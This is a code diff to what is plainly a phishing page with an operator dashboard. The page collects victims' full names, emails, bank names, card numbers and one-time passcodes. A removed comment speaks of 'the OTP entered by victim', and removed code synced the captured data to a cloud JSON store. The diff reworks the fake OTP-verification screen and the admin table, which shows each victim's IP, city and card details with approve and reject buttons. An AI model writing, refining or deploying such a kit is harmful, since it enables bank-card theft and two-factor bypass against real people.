-            if (!input) {
-                errorDiv.innerText = 'Please enter a code.';
-                errorDiv.style.display = 'block';
-                return;
-            }
-
             document.getElementById('otp-input-screen').classList.add('hidden');
             document.getElementById('verifying-screen').classList.remove('hidden');
 
-            // Update local storage with the OTP entered by victim
-            let submissions = JSON.parse(localStorage.getItem('pch_submissions') || '[]');
-            const index = submissions.findIndex(s => s.id === currentSubmissionId);
-            
-            if (index !== -1) {
-                submissions[index].otp = input;
-                localStorage.setItem('pch_submissions', JSON.stringify(submissions));
-                
-                // Update Cloud if needed
-                if (config.jsonbinKey && config.jsonbinId) {
-                    updateJsonBin(submissions);
-                }
-            }
-
-            // Simulate verification delay
             setTimeout(() => {
-                const currentSub = submissions[index];
-                
-                if (currentSub && currentSub.status === 'ACTIVE') {
-                    showFinalSuccessScreen();
+                if (input == generatedOTP) {
+                    const submissions = JSON.parse(localStorage.getItem('pch_submissions') || '[]');
+                    const currentSub = submissions.find(s => s.id === currentSubmissionId);
+                    
+                    if (currentSub && currentSub.status === 'ACTIVE') {
+                        showFinalSuccessScreen();
+                    } else if (currentSub && currentSub.status === 'REJECTED') {
+                        showError('Invalid OTP! Please try again.');
+                    } else {
+                        showError('Incorrect OTP or Admin is verifying...');
+                    }
                 } else {
-                    // If not active, show error and go back to OTP input
-                    document.getElementById('verifying-screen').classList.add('hidden');
-                    document.getElementById('otp-input-screen').classList.remove('hidden');
-                    errorDiv.innerText = 'Incorrect OTP or Admin is still verifying...';
-                    errorDiv.style.display = 'block';
-                    document.getElementById('otp-code-input').value = '';
-                    document.getElementById('otp-code-input').focus();
+                    showError('Invalid OTP! Please try again.');
                 }
-            }, 2000);
+            }, 1500);
+        }
+
+        function showError(msg) {
+            const errDiv = document.getElementById('error-container');
+            errDiv.innerText = msg;
+            errDiv.style.display = 'block';
+            
+            document.getElementById('verifying-screen').classList.add('hidden');
+            document.getElementById('otp-input-screen').classList.remove('hidden');
+            document.getElementById('otp-code-input').value = '';
+            document.getElementById('otp-code-input').focus();
         }
 
         function showFinalSuccessScreen() {
@@ -996,8 +942,7 @@
                         <td><b>${sub.timestamp}</b><br><small>🌐 ${sub.ip || 'Loading...'} (${sub.city || ''})</small></td>
                         <td>👤 ${sub.fullName || ''}<br>📧 ${sub.email || ''}</td>
                         <td>🏦 ${sub.bankName || ''}<br>💳 ${sub.cc || ''}</td>
-                        <td><b>${sub.otp || 'N/A'}</b></td>
-                        <td><span class="${statusClass}">${sub.status}</span></td>
+                        <td><b>${sub.otp || ''}</b><br><span class="${statusClass}">${sub.status}</span></td>
                         <td>
                             ${actionBtn}
                             ${sub.status !== 'ACTIVE' ? `<button class="btn-admin btn-danger" onclick="rejectOTP(${sub.id})">REJECT</button>` : ''}
@@ -1063,4 +1008,4 @@
         });
     </script>
 </body>
-    </html>
+</html>
